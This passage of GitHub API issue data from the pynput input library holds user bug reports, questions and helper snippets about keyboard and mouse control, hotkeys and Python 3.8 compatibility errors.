"milestone": null, "comments": 4, "created_at": "2019-10-28T11:58:26Z", "updated_at": "2019-12-04T16:06:41Z", "closed_at": "2019-12-04T16:06:40Z", "author_association": "NONE", "active_lock_reason": null, "body": "I saw a pull request on vk media keys support but when i type those with\r\n```\r\nfrom pynput.keyboard import Key, Controller\r\n\r\nkeyboard = Controller()\r\n\r\n# Press and release play pause\r\nkeyboard.press(Key.media_play_pause)\r\nkeyboard.release(Key.media_play_pause)\r\n```\r\nit's giving me error\r\n```\r\nTraceback (most recent call last):\r\n  File \"presskeys.py\", line 6, in <module>\r\n    keyboard.press(Key.media_play_pause)\r\n  File \"C:\\Users\\shivam\\AppData\\Local\\Programs\\Python\\Python37\\lib\\enum.py\", line 349, in __getattr__\r\n    raise AttributeError(name) from None\r\nAttributeError: media_play_pause\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/188", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/188/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/188/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/188/events", "html_url": "https://github.com/moses-palmer/pynput/issues/188", "id": 510389488, "node_id": "MDU6SXNzdWU1MTAzODk0ODg=", "number": 188, "title": "keyboard controller error in python3.8", "user": {"login": "rearyx", "id": 38980741, "node_id": "MDQ6VXNlcjM4OTgwNzQx", "avatar_url": "https://avatars3.githubusercontent.com/u/38980741?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rearyx", "html_url": "https://github.com/rearyx", "followers_url": "https://api.github.com/users/rearyx/followers", "following_url": "https://api.github.com/users/rearyx/following{/other_user}", "gists_url": "https://api.github.com/users/rearyx/gists{/gist_id}", "starred_url": "https://api.github.com/users/rearyx/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rearyx/subscriptions", "organizations_url": "https://api.github.com/users/rearyx/orgs", "repos_url": "https://api.github.com/users/rearyx/repos", "events_url": "https://api.github.com/users/rearyx/events{/privacy}", "received_events_url": "https://api.github.com/users/rearyx/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-10-22T02:05:15Z", "updated_at": "2019-11-29T18:41:07Z", "closed_at": "2019-11-29T18:41:07Z", "author_association": "NONE", "active_lock_reason": null, "body": "Are there any new features that are causing errors\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"/Users/catmeat/forchange/personal/mygui/myautogui.py\", line 6, in <module>\r\n    keyboard.press(Key.space)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.8/lib/python3.8/site-packages/pynput/keyboard/_base.py\", line 379, in press\r\n    self._handle(resolved, True)\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.8/lib/python3.8/site-packages/pynput/keyboard/_darwin.py\", line 140, in _handle\r\n    (key if key not in Key else key.value)._event(\r\n  File \"/Library/Frameworks/Python.framework/Versions/3.8/lib/python3.8/enum.py\", line 310, in __contains__\r\n    raise TypeError(\r\nTypeError: unsupported operand type(s) for 'in': 'KeyCode' and 'EnumMeta'\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/186", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/186/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/186/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/186/events", "html_url": "https://github.com/moses-palmer/pynput/issues/186", "id": 504710425, "node_id": "MDU6SXNzdWU1MDQ3MTA0MjU=", "number": 186, "title": "Is this a keyboard input for the driver level?", "user": {"login": "PalaChen", "id": 17638267, "node_id": "MDQ6VXNlcjE3NjM4MjY3", "avatar_url": "https://avatars3.githubusercontent.com/u/17638267?v=4", "gravatar_id": "", "url": "https://api.github.com/users/PalaChen", "html_url": "https://github.com/PalaChen", "followers_url": "https://api.github.com/users/PalaChen/followers", "following_url": "https://api.github.com/users/PalaChen/following{/other_user}", "gists_url": "https://api.github.com/users/PalaChen/gists{/gist_id}", "starred_url": "https://api.github.com/users/PalaChen/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/PalaChen/subscriptions", "organizations_url": "https://api.github.com/users/PalaChen/orgs", "repos_url": "https://api.github.com/users/PalaChen/repos", "events_url": "https://api.github.com/users/PalaChen/events{/privacy}", "received_events_url": "https://api.github.com/users/PalaChen/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-09T15:01:12Z", "updated_at": "2019-11-05T20:52:33Z", "closed_at": "2019-11-05T20:52:33Z", "author_association": "NONE", "active_lock_reason": null, "body": "Is this a keyboard input for the driver level?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/185", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/185/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/185/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/185/events", "html_url": "https://github.com/moses-palmer/pynput/issues/185", "id": 501828810, "node_id": "MDU6SXNzdWU1MDE4Mjg4MTA=", "number": 185, "title": "How to stop a key message?", "user": {"login": "zxcvbnm3057", "id": 48760372, "node_id": "MDQ6VXNlcjQ4NzYwMzcy", "avatar_url": "https://avatars0.githubusercontent.com/u/48760372?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zxcvbnm3057", "html_url": "https://github.com/zxcvbnm3057", "followers_url": "https://api.github.com/users/zxcvbnm3057/followers", "following_url": "https://api.github.com/users/zxcvbnm3057/following{/other_user}", "gists_url": "https://api.github.com/users/zxcvbnm3057/gists{/gist_id}", "starred_url": "https://api.github.com/users/zxcvbnm3057/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zxcvbnm3057/subscriptions", "organizations_url": "https://api.github.com/users/zxcvbnm3057/orgs", "repos_url": "https://api.github.com/users/zxcvbnm3057/repos", "events_url": "https://api.github.com/users/zxcvbnm3057/events{/privacy}", "received_events_url": "https://api.github.com/users/zxcvbnm3057/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-03T03:20:06Z", "updated_at": "2019-11-05T20:55:10Z", "closed_at": "2019-11-05T20:55:09Z", "author_association": "NONE", "active_lock_reason": null, "body": "I want to intercept a key message before it has influenced, but I haven't find a method to do it. Is there anyway else? Thanks for any help.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/182", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/182/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/182/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/182/events", "html_url": "https://github.com/moses-palmer/pynput/issues/182", "id": 493378157, "node_id": "MDU6SXNzdWU0OTMzNzgxNTc=", "number": 182, "title": "Suggestion: Add hotkey simulation, listen and simpler operation interface, why not?", "user": {"login": "BruceLee569", "id": 49506152, "node_id": "MDQ6VXNlcjQ5NTA2MTUy", "avatar_url": "https://avatars2.githubusercontent.com/u/49506152?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BruceLee569", "html_url": "https://github.com/BruceLee569", "followers_url": "https://api.github.com/users/BruceLee569/followers", "following_url": "https://api.github.com/users/BruceLee569/following{/other_user}", "gists_url": "https://api.github.com/users/BruceLee569/gists{/gist_id}", "starred_url": "https://api.github.com/users/BruceLee569/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BruceLee569/subscriptions", "organizations_url": "https://api.github.com/users/BruceLee569/orgs", "repos_url": "https://api.github.com/users/BruceLee569/repos", "events_url": "https://api.github.com/users/BruceLee569/events{/privacy}", "received_events_url": "https://api.github.com/users/BruceLee569/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-09-13T15:09:57Z", "updated_at": "2019-11-28T09:17:41Z", "closed_at": "2019-11-28T09:17:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "**The following is my own simple api code, hope it will help:**\r\n\r\n```\r\nimport pynput\r\nimport time\r\n\r\nmouse = pynput.mouse.Controller()\r\nButton = pynput.mouse.Button\r\nMouseListener = pynput.mouse.Listener\r\n\r\nkeyboard = pynput.keyboard.Controller()\r\nKey = pynput.keyboard.Key\r\nKeyboardListener = pynput.keyboard.Listener\r\n\r\n\r\ndef key_stroke(key, delay=0.01):\r\n    \"\"\"Keystroke, supporting single letters and control keys.\"\"\"\r\n    if len(key) == 1:\r\n        keyboard.press(key)\r\n        keyboard.release(key)\r\n    else:\r\n        keyboard.press(getattr(Key, key))\r\n        keyboard.release(getattr(Key, key))\r\n    time.sleep(delay)\r\n\r\n\r\ndef key_combination(multi_key, delay=0.01):\r\n    \"\"\"Simulate combination keys are struck, stack in and out in string order\"\"\"\r\n    keys = multi_key.split('+')\r\n    for k in keys:\r\n        if len(k) == 1:\r\n            keyboard.press(k)\r\n        else:\r\n            keyboard.press(getattr(Key, k))\r\n    for k in keys[::-1]:\r\n        if len(k) == 1:\r\n            keyboard.release(k)\r\n        else:\r\n            keyboard.release(getattr(Key, k))\r\n    time.sleep(delay)\r\n\r\n\r\ndef key_copy():\r\n    \"\"\"Simulate keyboard copy\"\"\"\r\n    key_combination('ctrl+c')\r\n\r\n\r\ndef key_paste():\r\n    \"\"\"Simulate keyboard paste\"\"\"\r\n    key_combination('ctrl+v')\r\n\r\n\r\ndef mouse_click(x=None, y=None, delay=0.05):\r\n    \"\"\"When the mouse clicks and x and y do not fill in, click at the current coordinate\"\"\"\r\n    if x and y:\r\n        mouse_move(x, y)\r\n        mouse.click(Button.left, 1)\r\n    else:\r\n        mouse.click(Button.left, 1)\r\n    time.sleep(delay)\r\n\r\ndef multi_hotkey_listen(hotkey_dict):\r\n    \"\"\"Multi-hotkey listen\"\"\"\r\n\r\n    # Create a mapping of hot keys to function, use hashable frozenset as keys\r\n    # Original set type is not hashable - so they can't be used as keys of dict\r\n    frozen_hotkey_dict = {frozenset(k.split('+')): v for k, v in hotkey_dict.items()}\r\n    # Currently pressed keys\r\n    current_keys = set()\r\n\r\n    def on_press(key):\r\n        \"\"\"When a key is pressed, add it to the set we are keeping track of\r\n        and check if this set is in the dictionary\"\"\"\r\n        try:\r\n            key_str = key.char\r\n        except AttributeError:\r\n            key_str = key.name\r\n\r\n        current_keys.add(key_str)\r\n        # print(current_keys)\r\n        if frozenset(current_keys) in frozen_hotkey_dict:\r\n            # If the current set of keys are in the mapping, execute the function\r\n            trigger_func = frozen_hotkey_dict[frozenset(current_keys)]\r\n            print(f'Success\uff1afunction {trigger_func.__name__} be triggered', )\r\n            trigger_func()\r\n\r\n    def on_release(key):\r\n        \"\"\"When a key is released, remove it from the set of keys we are keeping track of\"\"\"\r\n        try:\r\n            key_str = key.char\r\n        except AttributeError:\r\n            key_str = key.name\r\n        current_keys.remove(key_str)\r\n\r\n    with KeyboardListener(on_press=on_press, on_release=on_release, suppress=False) as listener:\r\n        listener.join()\r\n\r\n\r\nhotkey_dict = {\r\n    'f1': key_copy,   # support combination key like ctrl+shift+1\r\n    'f2': key_paste,\r\n}\r\n\r\nmulti_hotkey_listen(hotkey_dict)\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/181", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/181/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/181/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/181/events", "html_url": "https://github.com/moses-palmer/pynput/issues/181", "id": 487837703, "node_id": "MDU6SXNzdWU0ODc4Mzc3MDM=", "number": 181, "title": "No module named 'Quartz' on Windows", "user": {"login": "Stantl3r", "id": 20550964, "node_id": "MDQ6VXNlcjIwNTUwOTY0", "avatar_url": "https://avatars2.githubusercontent.com/u/20550964?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Stantl3r", "html_url": "https://github.com/Stantl3r", "followers_url": "https://api.github.com/users/Stantl3r/followers", "following_url": "https://api.github.com/users/Stantl3r/following{/other_user}", "gists_url": "https://api.github.com/users/Stantl3r/gists{/gist_id}", "starred_url": "https://api.github.com/users/Stantl3r/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Stantl3r/subscriptions", "organizations_url": "https://api.github.com/users/Stantl3r/orgs", "repos_url": "https://api.github.com/users/Stantl3r/repos", "events_url": "https://api.github.com/users/Stantl3r/events{/privacy}", "received_events_url": "https://api.github.com/users/Stantl3r/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-09-01T04:14:56Z", "updated_at": "2019-09-01T05:37:24Z", "closed_at": "2019-09-01T05:37:24Z", "author_association": "NONE", "active_lock_reason": null, "body": "When I try and check on mouse load a list of mouse events, I get this error on my Windows 10 machine. Any advice?\r\n\r\n`Traceback (most recent call last):\r\n  File \"server.py\", line 46, in <module>\r\n    mouse_clicks = pickle.loads(pickled_clicks)\r\n  File \"C:\\Users\\Stanley\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\site-packages\\pynput\\mouse\\_darwin.py\", line 28, in <module>\r\n    import Quartz\r\nModuleNotFoundError: No module named 'Quartz'` ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/180", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/180/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/180/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/180/events", "html_url": "https://github.com/moses-palmer/pynput/issues/180", "id": 483556503, "node_id": "MDU6SXNzdWU0ODM1NTY1MDM=", "number": 180, "title": "Reading from input with specific Device Id, Vendor id ", "user": {"login": "harshitgoel96", "id": 4772083, "node_id": "MDQ6VXNlcjQ3NzIwODM=", "avatar_url": "https://avatars1.githubusercontent.com/u/4772083?v=4", "gravatar_id": "", "url": "https://api.github.com/users/harshitgoel96", "html_url": "https://github.com/harshitgoel96", "followers_url": "https://api.github.com/users/harshitgoel96/followers", "following_url": "https://api.github.com/users/harshitgoel96/following{/other_user}", "gists_url": "https://api.github.com/users/harshitgoel96/gists{/gist_id}", "starred_url": "https://api.github.com/users/harshitgoel96/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/harshitgoel96/subscriptions", "organizations_url": "https://api.github.com/users/harshitgoel96/orgs", "repos_url": "https://api.github.com/users/harshitgoel96/repos", "events_url": "https://api.github.com/users/harshitgoel96/events{/privacy}", "received_events_url": "https://api.github.com/users/harshitgoel96/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-08-21T17:39:01Z", "updated_at": "2019-09-06T13:07:43Z", "closed_at": "2019-09-06T13:07:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am looking to read from a keyboard with specific Device Id to run some specific tasks. How can I filter the key based on device id and vendor is? ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/179", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/179/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/179/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/179/events", "html_url": "https://github.com/moses-palmer/pynput/issues/179", "id": 483292459, "node_id": "MDU6SXNzdWU0ODMyOTI0NTk=", "number": 179, "title": "Arguments keyboard listener on_click", "user": {"login": "ebonmati", "id": 16720185, "node_id": "MDQ6VXNlcjE2NzIwMTg1", "avatar_url": "https://avatars2.githubusercontent.com/u/16720185?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ebonmati", "html_url": "https://github.com/ebonmati", "followers_url": "https://api.github.com/users/ebonmati/followers", "following_url": "https://api.github.com/users/ebonmati/following{/other_user}", "gists_url": "https://api.github.com/users/ebonmati/gists{/gist_id}", "starred_url": "https://api.github.com/users/ebonmati/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ebonmati/subscriptions", "organizations_url": "https://api.github.com/users/ebonmati/orgs", "repos_url": "https://api.github.com/users/ebonmati/repos", "events_url": "https://api.github.com/users/ebonmati/events{/privacy}", "received_events_url": "https://api.github.com/users/ebonmati/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-08-21T09:03:33Z", "updated_at": "2019-09-06T13:20:55Z", "closed_at": "2019-09-06T13:20:54Z", "author_association": "NONE", "active_lock_reason": null, "body": "I would like to do something like this:\r\n\r\nFunction definition:\r\n\r\ndef on_press(key, **config**):\r\n\r\nIn the main function:\r\n\r\nlistener = keyboard.Listener(on_press=on_press(**config**))\r\nlistener.start()\r\n\r\nHowever, I am not sure what is the best way to handle arguments, or if its possible as the on_press function is in a different thread?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/178", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/178/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/178/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/178/events", "html_url": "https://github.com/moses-palmer/pynput/issues/178", "id": 482613876, "node_id": "MDU6SXNzdWU0ODI2MTM4NzY=", "number": 178, "title": "Issue with pynput", "user": {"login": "BeardedSilence", "id": 51518636, "node_id": "MDQ6VXNlcjUxNTE4NjM2", "avatar_url": "https://avatars2.githubusercontent.com/u/51518636?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BeardedSilence", "html_url": "https://github.com/BeardedSilence", "followers_url": "https://api.github.com/users/BeardedSilence/followers", "following_url": "https://api.github.com/users/BeardedSilence/following{/other_user}", "gists_url": "https://api.github.com/users/BeardedSilence/gists{/gist_id}", "starred_url": "https://api.github.com/users/BeardedSilence/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BeardedSilence/subscriptions", "organizations_url": "https://api.github.com/users/BeardedSilence/orgs", "repos_url": "https://api.github.com/users/BeardedSilence/repos", "events_url": "https://api.github.com/users/BeardedSilence/events{/privacy}", "received_events_url": "https://api.github.com/users/BeardedSilence/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-08-20T02:36:50Z", "updated_at": "2019-09-06T13:22:16Z", "closed_at": "2019-09-06T13:22:16Z", "author_association": "NONE", "active_lock_reason": null, "body": "Exception has occurred: ModuleNotFoundError\r\nNo module named 'pynput'\r\n  File \"C:\\Users\\Jorda\\Desktop\\Keylogger.py\", line 1, in <module>\r\n    from pynput.keyboard import Key, Listener\r\n\r\nI keep receiving this message while running debug. I have pip installed pynput and im still having trouble. Any advice would be greatly appreciated\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/177", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/177/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/177/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/177/events", "html_url": "https://github.com/moses-palmer/pynput/issues/177", "id": 482613546, "node_id": "MDU6SXNzdWU0ODI2MTM1NDY=", "number": 177, "title": "Issue with: ", "user": {"login": "BeardedSilence", "id": 51518636, "node_id": "MDQ6VXNlcjUxNTE4NjM2", "avatar_url": "https://avatars2.githubusercontent.com/u/51518636?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BeardedSilence", "html_url": "https://github.com/BeardedSilence", "followers_url": "https://api.github.com/users/BeardedSilence/followers", "following_url": "https://api.github.com/users/BeardedSilence/following{/other_user}", "gists_url": "https://api.github.com/users/BeardedSilence/gists{/gist_id}", "starred_url": "https://api.github.com/users/BeardedSilence/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BeardedSilence/subscriptions", "organizations_url": "https://api.github.com/users/BeardedSilence/orgs", "repos_url": "https://api.github.com/users/BeardedSilence/repos", "events_url": "https://api.github.com/users/BeardedSilence/events{/privacy}", "received_events_url": "https://api.github.com/users/BeardedSilence/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-08-20T02:35:23Z", "updated_at": "2019-09-06T13:22:25Z", "closed_at": "2019-09-06T13:22:25Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/176", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/176/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/176/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/176/events", "html_url": "https://github.com/moses-palmer/pynput/issues/176", "id": 481932869, "node_id": "MDU6SXNzdWU0ODE5MzI4Njk=", "number": 176, "title": "Weird ctrl + alt behavior", "user": {"login": "guydht", "id": 19510104, "node_id": "MDQ6VXNlcjE5NTEwMTA0", "avatar_url": "https://avatars1.githubusercontent.com/u/19510104?v=4", "gravatar_id": "", "url": "https://api.github.com/users/guydht", "html_url": "https://github.com/guydht", "followers_url": "https://api.github.com/users/guydht/followers", "following_url": "https://api.github.com/users/guydht/following{/other_user}", "gists_url": "https://api.github.com/users/guydht/gists{/gist_id}", "starred_url": "https://api.github.com/users/guydht/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/guydht/subscriptions", "organizations_url": "https://api.github.com/users/guydht/orgs", "repos_url": "https://api.github.com/users/guydht/repos", "events_url": "https://api.github.com/users/guydht/events{/privacy}", "received_events_url": "https://api.github.com/users/guydht/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-08-17T22:40:30Z", "updated_at": "2019-08-18T21:19:59Z", "closed_at": "2019-08-18T21:19:59Z", "author_association": "NONE", "active_lock_reason": null, "body": "When listening to keyboard events, for some reason when I press the \"alt\" key while the \"ctrl\" key is pressed, the ctrl key is released immediately without me physically releasing it. Then when I actually let go of the ctrl key the event doesn't fire (It's as if the release event is triggered just because I pressed alt).\r\nHere's an example of when it happens:\r\n```\r\ncurrently_pressed_keys = set()\r\n\r\ndef handle_key_down(e):\r\n    if isinstance(e, Enum):\r\n        currently_pressed_keys.add(e)\r\n        if {e.ctrl, e.alt}.issubset(currently_pressed_keys):\r\n            mouse_down()\r\n\r\ndef handle_key_up(e):\r\n    if isinstance(e, Enum):\r\n        if e in currently_pressed_keys:\r\n            currently_pressed_keys.remove(e)\r\n        if e.ctrl is e:\r\n            mouse_up()\r\n```\r\nIf I do these actions in this order:\r\n### ctrl down -> alt down -> alt up \r\nIt triggers this:\r\n### ctrl down -> alt down -> **_**ctrl up**_** -> alt up\r\nI'm using ubuntu 19.04,\r\nbut I'm pretty sure it's not a hardware issue since the [keyboard](https://github.com/boppreh/keyboard) module doesn't have this weird behavior (and I'd rather use pynput since it doesn't require root)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/175", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/175/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/175/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/175/events", "html_url": "https://github.com/moses-palmer/pynput/issues/175", "id": 471735330, "node_id": "MDU6SXNzdWU0NzE3MzUzMzA=", "number": 175, "title": "Reading HID Reserved keycode", "user": {"login": "harshitgoel96", "id": 4772083, "node_id": "MDQ6VXNlcjQ3NzIwODM=", "avatar_url": "https://avatars1.githubusercontent.com/u/4772083?v=4", "gravatar_id": "", "url": "https://api.github.com/users/harshitgoel96", "html_url": "https://github.com/harshitgoel96", "followers_url": "https://api.github.com/users/harshitgoel96/followers", "following_url": "https://api.github.com/users/harshitgoel96/following{/other_user}", "gists_url": "https://api.github.com/users/harshitgoel96/gists{/gist_id}", "starred_url": "https://api.github.com/users/harshitgoel96/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/harshitgoel96/subscriptions", "organizations_url": "https://api.github.com/users/harshitgoel96/orgs", "repos_url": "https://api.github.com/users/harshitgoel96/repos", "events_url": "https://api.github.com/users/harshitgoel96/events{/privacy}", "received_events_url": "https://api.github.com/users/harshitgoel96/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-07-23T14:35:48Z", "updated_at": "2019-08-21T17:35:17Z", "closed_at": "2019-08-21T17:35:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\n\r\nFrom key HID Keyboard, if I send the HID Reserved HEX keycodes like 0xDE, how can I read it ?\r\nI see there is a KeyCode object, but I don't find a method to match/read the hex keycode", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/173", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/173/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/173/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/173/events", "html_url": "https://github.com/moses-palmer/pynput/issues/173", "id": 467174002, "node_id": "MDU6SXNzdWU0NjcxNzQwMDI=", "number": 173, "title": "Deprecation of Enum containment check in Python 3.8", "user": {"login": "asweigart", "id": 52220, "node_id": "MDQ6VXNlcjUyMjIw", "avatar_url": "https://avatars2.githubusercontent.com/u/52220?v=4", "gravatar_id": "", "url": "https://api.github.com/users/asweigart", "html_url": "https://github.com/asweigart", "followers_url": "https://api.github.com/users/asweigart/followers", "following_url": "https://api.github.com/users/asweigart/following{/other_user}", "gists_url": "https://api.github.com/users/asweigart/gists{/gist_id}", "starred_url": "https://api.github.com/users/asweigart/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/asweigart/subscriptions", "organizations_url": "https://api.github.com/users/asweigart/orgs", "repos_url": "https://api.github.com/users/asweigart/repos", "events_url": "https://api.github.com/users/asweigart/events{/privacy}", "received_events_url": "https://api.github.com/users/asweigart/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-12T01:17:41Z", "updated_at": "2019-09-24T20:32:46Z", "closed_at": "2019-09-24T20:32:45Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I encountered this error when calling press():\r\n\r\n    TypeError: unsupported operand type(s) for 'in': 'str' and 'EnumMeta'\r\n\r\nThis happens in Python 3.8 because you can't do `someEnum in EnumClass` code anymore. (There was a deprecation warning in 3.7).\r\n\r\nI'll post a PR with a backwards-compatible fix shortly.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/172", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/172/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/172/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/172/events", "html_url": "https://github.com/moses-palmer/pynput/issues/172", "id": 466733996, "node_id": "MDU6SXNzdWU0NjY3MzM5OTY=", "number": 172, "title": "launching shell window using raspberry pi hotkey breaks GPIO script", "user": {"login": "MidnightTanny", "id": 52680455, "node_id": "MDQ6VXNlcjUyNjgwNDU1", "avatar_url": "https://avatars2.githubusercontent.com/u/52680455?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MidnightTanny", "html_url": "https://github.com/MidnightTanny", "followers_url": "https://api.github.com/users/MidnightTanny/followers", "following_url": "https://api.github.com/users/MidnightTanny/following{/other_user}", "gists_url": "https://api.github.com/users/MidnightTanny/gists{/gist_id}", "starred_url": "https://api.github.com/users/MidnightTanny/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MidnightTanny/subscriptions", "organizations_url": "https://api.github.com/users/MidnightTanny/orgs", "repos_url": "https://api.github.com/users/MidnightTanny/repos", "events_url": "https://api.github.com/users/MidnightTanny/events{/privacy}", "received_events_url": "https://api.github.com/users/MidnightTanny/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-07-11T08:12:32Z", "updated_at": "2019-12-04T21:23:23Z", "closed_at": "2019-12-04T21:23:22Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am using pynput in a short script to launch a terminal window on a raspberry pi using the GPIO pins to initiate the keyboard controller. (These Pi units will not have a mouse or keyboard on them, only a simple 2-button interface to start and stop the program)\r\n\r\nWhat I am running into is that when I use pynput to press 